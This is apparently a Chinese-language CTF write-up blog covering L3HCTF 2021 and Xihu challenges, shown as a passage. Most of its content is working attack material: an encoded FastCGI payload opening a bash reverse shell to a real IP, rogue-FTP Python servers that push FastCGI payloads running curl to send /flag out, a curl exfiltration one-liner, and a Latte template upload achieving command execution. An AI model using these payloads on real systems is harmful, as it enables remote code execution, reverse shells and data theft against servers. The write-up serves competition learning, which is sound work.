<p>%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%01%05%05%00%0F%10SERVER_SOFTWAREgo%20&#x2F;%20fcgiclient%20%0B%09REMOTE_ADDR127.0.0.1%0F%08SERVER_PROTOCOLHTTP&#x2F;1.1%0E%03CONTENT_LENGTH105%0E%04REQUEST_METHODPOST%09KPHP_VALUEallow_url_include%20%3D%20On%0Adisable_functions%20%3D%20%0Aauto_prepend_file%20%3D%20php%3A&#x2F;&#x2F;input%0F%17SCRIPT_FILENAME&#x2F;var&#x2F;www&#x2F;html&#x2F;index.php%0D%01DOCUMENT_ROOT&#x2F;%00%00%00%00%00%01%04%00%01%00%00%00%00%01%05%00%01%00i%04%00%3C%3Fphp%20system%28%27bash%20-c%20%22bash%20-i%20%3E%26%20&#x2F;dev&#x2F;tcp&#x2F;47.107.56.244&#x2F;8085%200%3E%261%22%27%29%3Bdie%28%27—–Made-by-SpyD3r—–%0A%27%29%3B%3F%3E%00%00%00%00</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) </span><br><span class="line">s.bind((<span class="string">&#x27;0.0.0.0&#x27;</span>, <span class="number">8084</span>))</span><br><span class="line">s.listen(<span class="number">1</span>)</span><br><span class="line">conn, addr = s.accept()</span><br><span class="line">conn.send(<span class="string">b&#x27;220 welcome\n&#x27;</span>)</span><br><span class="line"><span class="comment">#Service ready for new user.</span></span><br><span class="line"><span class="comment">#Client send anonymous username</span></span><br><span class="line"><span class="comment">#USER anonymous</span></span><br><span class="line">conn.send(<span class="string">b&#x27;331 Please specify the password.\n&#x27;</span>)</span><br><span class="line"><span class="comment">#User name okay, need password.</span></span><br><span class="line"><span class="comment">#Client send anonymous password.</span></span><br><span class="line"><span class="comment">#PASS anonymous</span></span><br><span class="line">conn.send(<span class="string">b&#x27;230 Login successful.\n&#x27;</span>)</span><br><span class="line"><span class="comment">#User logged in, proceed. Logged out if appropriate.</span></span><br><span class="line"><span class="comment">#TYPE I</span></span><br><span class="line">conn.send(<span class="string">b&#x27;200 Switching to Binary mode.\n&#x27;</span>)</span><br><span class="line"><span class="comment">#Size /</span></span><br><span class="line">conn.send(<span class="string">b&#x27;550 Could not get the file size.\n&#x27;</span>)</span><br><span class="line"><span class="comment">#EPSV (1)</span></span><br><span class="line">conn.send(<span class="string">b&#x27;150 ok\n&#x27;</span>)</span><br><span class="line"><span class="comment">#PASV</span></span><br><span class="line">conn.send(<span class="string">b&#x27;227 Entering Extended Passive Mode (127,0,0,1,0,9001)\n&#x27;</span>) <span class="comment">#STOR / (2)</span></span><br><span class="line">conn.send(<span class="string">b&#x27;150 Permission denied.\n&#x27;</span>)</span><br><span class="line"><span class="comment">#QUIT</span></span><br><span class="line">conn.send(<span class="string">b&#x27;221 Goodbye.\n&#x27;</span>)</span><br><span class="line">conn.close()</span><br></pre></td></tr></table></figure>


<p>curl <span class="exturl" data-url="aHR0cDovLzQ3LjEwNy41Ni4yNDQ6ODA4NS8/ZmxhZ0lzLSQ=">http://47.107.56.244:8085/?flagIs-$</span>(cat &#x2F;flag | base64)</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> unquote</span><br><span class="line"></span><br><span class="line">payload = unquote(<span class="string">&quot;%01%01%1EJ%00%08%00%00%00%01%00%00%00%00%00%00%01%04%1EJ%02%16%00%00%11%0BGATEWAY_INTERFACEFastCGI/1.0%0E%04REQUEST_METHODPOST%0F%17SCRIPT_FILENAME/var/www/html/index.php%0B%17SCRIPT_NAME/var/www/html/index.php%0C%00QUERY_STRING%0B%17REQUEST_URI/var/www/html/index.php%0D%01DOCUMENT_ROOT/%0F%0ESERVER_SOFTWAREphp/fcgiclient%0B%09REMOTE_ADDR127.0.0.1%0B%04REMOTE_PORT9985%0B%09SERVER_ADDR127.0.0.1%0B%02SERVER_PORT80%0B%09SERVER_NAMElocalhost%0F%08SERVER_PROTOCOLHTTP/1.1%0C%10CONTENT_TYPEapplication/text%0E%02CONTENT_LENGTH63%098PHP_VALUEauto_prepend_file%20%3D%20php%3A//input%3B%0D%0Aallow_url_include%20%3D%20On%0F8PHP_ADMIN_VALUEauto_prepend_file%20%3D%20php%3A//input%3B%0D%0Aallow_url_include%20%3D%20On%01%04%1EJ%00%00%00%00%01%05%1EJ%00%3F%00%00%3C%3Fphp%20system%28%27curl%20http%3A//47.107.56.244%3A8085/%20-F%20file%3D%40/flag%27%29%3B%3F%3E%01%05%1EJ%00%00%00%00&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload = payload.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"></span><br><span class="line">host = <span class="string">&#x27;0.0.0.0&#x27;</span></span><br><span class="line">port = <span class="number">23</span></span><br><span class="line">sk = socket.socket()</span><br><span class="line">sk.bind((host, port))</span><br><span class="line">sk.listen(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">sk2 = socket.socket()</span><br><span class="line">sk2.bind((host, <span class="number">39021</span>))</span><br><span class="line">sk2.listen()</span><br><span class="line"></span><br><span class="line">count = <span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    conn, address = sk.accept()</span><br><span class="line">    conn.send(<span class="string">b&quot;200 \n&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(conn.recv(<span class="number">20</span>))  </span><br><span class="line">    <span class="keyword">if</span> count == <span class="number">1</span>:</span><br><span class="line">        conn.send(<span class="string">b&quot;220 ready\n&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        conn.send(<span class="string">b&quot;200 ready\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(conn.recv(<span class="number">20</span>))   </span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> count == <span class="number">1</span>:</span><br><span class="line">        conn.send(<span class="string">b&quot;215 \n&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        conn.send(<span class="string">b&quot;200 \n&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(conn.recv(<span class="number">20</span>)) </span><br><span class="line">    <span class="keyword">if</span> count == <span class="number">1</span>:</span><br><span class="line">        conn.send(<span class="string">b&quot;213 3 \n&quot;</span>)  </span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        conn.send(<span class="string">b&quot;300 \n&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(conn.recv(<span class="number">20</span>))  </span><br><span class="line">    conn.send(<span class="string">b&quot;200 \n&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(conn.recv(<span class="number">20</span>))   </span><br><span class="line">    <span class="keyword">if</span> count == <span class="number">1</span>:</span><br><span class="line">        conn.send(<span class="string">b&quot;227 47,107,56,244,152,109\n&quot;</span>)  </span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        conn.send(<span class="string">b&quot;227 127,0,0,1,35,40\n&quot;</span>)  </span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(conn.recv(<span class="number">20</span>))  </span><br><span class="line">    <span class="keyword">if</span> count == <span class="number">1</span>:</span><br><span class="line">        conn.send(<span class="string">b&quot;125 \n&quot;</span>) </span><br><span class="line">        </span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;buildconnect!&quot;</span>)</span><br><span class="line">        conn2, address2 = sk2.accept()</span><br><span class="line">        conn2.send(payload)</span><br><span class="line">        conn2.close()</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;cutconnect!&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        conn.send(<span class="string">b&quot;150 \n&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(conn.recv(<span class="number">20</span>))</span><br><span class="line">        exit()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> count == <span class="number">1</span>:</span><br><span class="line">        conn.send(<span class="string">b&quot;226 \n&quot;</span>)</span><br><span class="line">    conn.close()</span><br><span class="line">    count += <span class="number">1</span></span><br></pre></td></tr></table></figure>

<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> unquote</span><br><span class="line"></span><br><span class="line">payload = unquote(<span class="string">&quot;%01%01%1EJ%00%08%00%00%00%01%00%00%00%00%00%00%01%04%1EJ%02%16%00%00%11%0BGATEWAY_INTERFACEFastCGI/1.0%0E%04REQUEST_METHODPOST%0F%17SCRIPT_FILENAME/var/www/html/index.php%0B%17SCRIPT_NAME/var/www/html/index.php%0C%00QUERY_STRING%0B%17REQUEST_URI/var/www/html/index.php%0D%01DOCUMENT_ROOT/%0F%0ESERVER_SOFTWAREphp/fcgiclient%0B%09REMOTE_ADDR127.0.0.1%0B%04REMOTE_PORT9985%0B%09SERVER_ADDR127.0.0.1%0B%02SERVER_PORT80%0B%09SERVER_NAMElocalhost%0F%08SERVER_PROTOCOLHTTP/1.1%0C%10CONTENT_TYPEapplication/text%0E%02CONTENT_LENGTH63%098PHP_VALUEauto_prepend_file%20%3D%20php%3A//input%3B%0D%0Aallow_url_include%20%3D%20On%0F8PHP_ADMIN_VALUEauto_prepend_file%20%3D%20php%3A//input%3B%0D%0Aallow_url_include%20%3D%20On%01%04%1EJ%00%00%00%00%01%05%1EJ%00%3F%00%00%3C%3Fphp%20system%28%27curl%20http%3A//47.107.56.244%3A8084/%20-F%20file%3D%40/flag%27%29%3B%3F%3E%01%05%1EJ%00%00%00%00&quot;</span>)</span><br><span class="line">payload = payload.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"></span><br><span class="line">host = <span class="string">&#x27;0.0.0.0&#x27;</span></span><br><span class="line">port = <span class="number">23</span></span><br><span class="line">sk = socket.socket()</span><br><span class="line">sk.bind((host, port))</span><br><span class="line">sk.listen(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ftp被动模式的passvie port,监听到1234</span></span><br><span class="line">sk2 = socket.socket()</span><br><span class="line">sk2.bind((host, <span class="number">1234</span>))</span><br><span class="line">sk2.listen()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 计数器，用于区分是第几次ftp连接</span></span><br><span class="line">count = <span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    conn, address = sk.accept()</span><br><span class="line">    conn.send(<span class="string">b&quot;200 \n&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(conn.recv(<span class="number">20</span>))  <span class="comment"># USER aaa\r\n  客户端传来用户名</span></span><br><span class="line">    <span class="keyword">if</span> count == <span class="number">1</span>:</span><br><span class="line">        conn.send(<span class="string">b&quot;220 ready\n&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        conn.send(<span class="string">b&quot;200 ready\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(conn.recv(<span class="number">20</span>))   <span class="comment"># TYPE I\r\n  客户端告诉服务端以什么格式传输数据，TYPE I表示二进制， TYPE A表示文本</span></span><br><span class="line">    <span class="keyword">if</span> count == <span class="number">1</span>:</span><br><span class="line">        conn.send(<span class="string">b&quot;215 \n&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        conn.send(<span class="string">b&quot;200 \n&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(conn.recv(<span class="number">20</span>))  <span class="comment"># SIZE /123\r\n  客户端询问文件/123的大小</span></span><br><span class="line">    <span class="keyword">if</span> count == <span class="number">1</span>:</span><br><span class="line">        conn.send(<span class="string">b&quot;213 3 \n&quot;</span>)  </span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        conn.send(<span class="string">b&quot;300 \n&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(conn.recv(<span class="number">20</span>))  <span class="comment"># EPSV\r\n&#x27;</span></span><br><span class="line">    conn.send(<span class="string">b&quot;200 \n&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(conn.recv(<span class="number">20</span>))   <span class="comment"># PASV\r\n  客户端告诉服务端进入被动连接模式</span></span><br><span class="line">    <span class="keyword">if</span> count == <span class="number">1</span>:</span><br><span class="line">        conn.send(<span class="string">b&quot;227 124,70,40,5,4,210\n&quot;</span>)  <span class="comment"># 服务端告诉客户端需要到哪个ip:port去获取数据,ip,port都是用逗号隔开，其中端口的计算规则为：4*256+210=1234</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        conn.send(<span class="string">b&quot;227 127,0,0,1,35,40\n&quot;</span>)  <span class="comment"># 端口计算规则：35*256+40=9000</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(conn.recv(<span class="number">20</span>))  <span class="comment"># 第一次连接会收到命令RETR /123\r\n，第二次连接会收到STOR /123\r\n</span></span><br><span class="line">    <span class="keyword">if</span> count == <span class="number">1</span>:</span><br><span class="line">        conn.send(<span class="string">b&quot;125 \n&quot;</span>) <span class="comment"># 告诉客户端可以开始数据链接了</span></span><br><span class="line">        <span class="comment"># 新建一个socket给服务端返回我们的payload</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;建立连接!&quot;</span>)</span><br><span class="line">        conn2, address2 = sk2.accept()</span><br><span class="line">        conn2.send(payload)</span><br><span class="line">        conn2.close()</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;断开连接!&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        conn.send(<span class="string">b&quot;150 \n&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(conn.recv(<span class="number">20</span>))</span><br><span class="line">        exit()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 第一次连接是下载文件，需要告诉客户端下载已经结束</span></span><br><span class="line">    <span class="keyword">if</span> count == <span class="number">1</span>:</span><br><span class="line">        conn.send(<span class="string">b&quot;226 \n&quot;</span>)</span><br><span class="line">    conn.close()</span><br><span class="line">    count += <span class="number">1</span></span><br></pre></td></tr></table></figure>

<h1 id="2021L3HCTF"><a href="#2021L3HCTF" class="headerlink" title="2021L3HCTF"></a>2021L3HCTF</h1><h2 id="EasyPHP"><a href="#EasyPHP" class="headerlink" title="EasyPHP"></a>EasyPHP</h2><p>多半是签到了</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="string">&quot;admin&quot;</span> == <span class="variable">$_GET</span>[username] &amp;‮⁦+!!⁩⁦&amp; <span class="string">&quot;‮⁦CTF⁩⁦l3hctf&quot;</span> == <span class="variable">$_GET</span>[‮⁦L3H⁩⁦password]) &#123; <span class="comment">//Welcome to </span></span><br><span class="line">    <span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;  </span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>本来看着是这样的</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="string">&quot;admin&quot;</span> == <span class="variable">$_GET</span>[username] &amp;&amp; <span class="string">&quot;l3hctf&quot;</span> == <span class="variable">$_GET</span>[password]) &#123; <span class="comment">//Welcome to L3HCTF+!!</span></span><br></pre></td></tr></table></figure>
<p>复制之后就成上面那样了</p>
<p>就挺简单的，被那两个东西框起来之后，显示就会被放到最后，也就是<code>-1</code>的位置，然后测了一下两个<code>&amp;</code>之间的那个不影响判断，其他就和正经传post一样</p>
<p>GET:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?username=admin&amp;%E2%<span class="number">80</span>%AE%E2%<span class="number">81</span>%A6L3H%E2%<span class="number">81</span>%A9%E2%<span class="number">81</span>%A6password=%E2%<span class="number">80</span>%AE%E2%<span class="number">81</span>%A6CTF%E2%<span class="number">81</span>%A9%E2%<span class="number">81</span>%A6l3hctf</span><br></pre></td></tr></table></figure>
<p>听说是什么rgb编码，挺危险的，但可以被url编码，就能看见了，他的格式一个块就是3个字符</p>
<h1 id="西湖论不懂剑"><a href="#西湖论不懂剑" class="headerlink" title="西湖论不懂剑"></a>西湖论不懂剑</h1><h2 id="灏妹的web"><a href="#灏妹的web" class="headerlink" title="灏妹的web"></a>灏妹的web</h2><p>就一张图，啥也没有，抓包看响应头也找不到任何提示</p>
<p>扫源码，啥都给200</p>
<p>复现：</p>
<p>扫到.DS_Store  </p>
<p>当时也扫到一些xml文件，没遇到过这个知识，就没注意，在gitgub上找到一个工具脚本：<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2xpamllamllL2RzX3N0b3JlX2V4cA==">DS_Store_exp</span></p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 url/.DS_Store</span><br></pre></td></tr></table></figure>
<p>扫描得到<code>.idea/dataSources</code><br>这是一个xml文件，访问即可得到（因为啥都返回200，所以当时只看了一些看到的xml文件，就没想到，难受了）</p>
<h2 id="ezupload"><a href="#ezupload" class="headerlink" title="ezupload"></a>ezupload</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;vendor/autoload.php&#x27;</span>;</span><br><span class="line"><span class="variable">$latte</span> = <span class="keyword">new</span> Latte\Engine;</span><br><span class="line"><span class="variable">$latte</span>-&gt;<span class="title function_ invoke__">setTempDirectory</span>(<span class="string">&#x27;tempdir&#x27;</span>);</span><br><span class="line"><span class="variable">$policy</span> = <span class="keyword">new</span> Latte\Sandbox\SecurityPolicy;</span><br><span class="line"><span class="variable">$policy</span>-&gt;<span class="title function_ invoke__">allowMacros</span>([<span class="string">&#x27;block&#x27;</span>, <span class="string">&#x27;if&#x27;</span>, <span class="string">&#x27;else&#x27;</span>,<span class="string">&#x27;=&#x27;</span>]);</span><br><span class="line"><span class="variable">$policy</span>-&gt;<span class="title function_ invoke__">allowFilters</span>(<span class="variable">$policy</span>::<span class="variable constant_">ALL</span>);</span><br><span class="line"><span class="variable">$policy</span>-&gt;<span class="title function_ invoke__">allowFunctions</span>([<span class="string">&#x27;trim&#x27;</span>, <span class="string">&#x27;strlen&#x27;</span>]);</span><br><span class="line"><span class="variable">$latte</span>-&gt;<span class="title function_ invoke__">setPolicy</span>(<span class="variable">$policy</span>);</span><br><span class="line"><span class="variable">$latte</span>-&gt;<span class="title function_ invoke__">setSandboxMode</span>();</span><br><span class="line"><span class="variable">$latte</span>-&gt;<span class="title function_ invoke__">setAutoRefresh</span>(<span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$uploaddir</span> = <span class="string">&#x27;/var/www/html/tempdir/&#x27;</span>;</span><br><span class="line">    <span class="variable">$filename</span> = <span class="title function_ invoke__">basename</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">stristr</span>(<span class="variable">$filename</span>,<span class="string">&#x27;p&#x27;</span>) <span class="keyword">or</span> <span class="title function_ invoke__">stristr</span>(<span class="variable">$filename</span>,<span class="string">&#x27;h&#x27;</span>) <span class="keyword">or</span> <span class="title function_ invoke__">stristr</span>(<span class="variable">$filename</span>,<span class="string">&#x27;..&#x27;</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;no&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$file_conents</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>]);</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$file_conents</span>)&gt;<span class="number">28</span> <span class="keyword">or</span> <span class="title function_ invoke__">stristr</span>(<span class="variable">$file_conents</span>,<span class="string">&#x27;&lt;&#x27;</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;no&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$uploadfile</span> = <span class="variable">$uploaddir</span> . <span class="variable">$filename</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>], <span class="variable">$uploadfile</span>)) &#123;</span><br><span class="line">        <span class="variable">$message</span> = <span class="variable">$filename</span> .<span class="string">&quot; was successfully uploaded.&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$message</span> = <span class="string">&quot;error!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$params</span> = [</span><br><span class="line">        <span class="string">&#x27;message&#x27;</span> =&gt; <span class="variable">$message</span>,</span><br><span class="line">    ];</span><br><span class="line">    <span class="variable">$latte</span>-&gt;<span class="title function_ invoke__">render</span>(<span class="string">&#x27;tempdir/index.latte&#x27;</span>, <span class="variable">$params</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;source&#x27;</span>]==<span class="number">1</span>)&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$latte</span>-&gt;<span class="title function_ invoke__">render</span>(<span class="string">&#x27;tempdir/index.latte&#x27;</span>, [<span class="string">&#x27;message&#x27;</span>=&gt;<span class="string">&#x27;Hellow My Glzjin!&#x27;</span>]);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
<p>有一个上传文件的点</p>
<p>对于文件名过滤了p和h</p>
<p>文件内容长度限制了28</p>
<p>预期：</p>
<p>latte的模板渲染rce</p>
<p>传文件：<br>POST:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;index.latte&quot;</span><br><span class="line">Content-Type: application/octet-stream</span><br><span class="line"></span><br><span class="line">&#123;=system%00($_GET[1])&#125;</span><br></pre></td></tr></table></figure>
<p>利用：<br>GET:?1&#x3D;ls</p>
<p>非预期：</p>
<p>传<code>.usr.ini</code></p>
<p>该文件可覆盖配置文件，使被设置的文件被任意php文件包含：</p>
<blockquote>
<p>auto_prepend_file&#x3D;”&#x2F;flag”</p>
</blockquote>
<p>但当前文件夹下还需要有一个php文件才能利用成功</p>
<!-- 这时候机灵的fmyyy1师傅找到了latte模板的临时文件 -->
<p>而正好latte模板会传一个临时php文件，访问即可包含获取到<code>/flag</code></p>
<p>而临时文件文件名的算法</p>
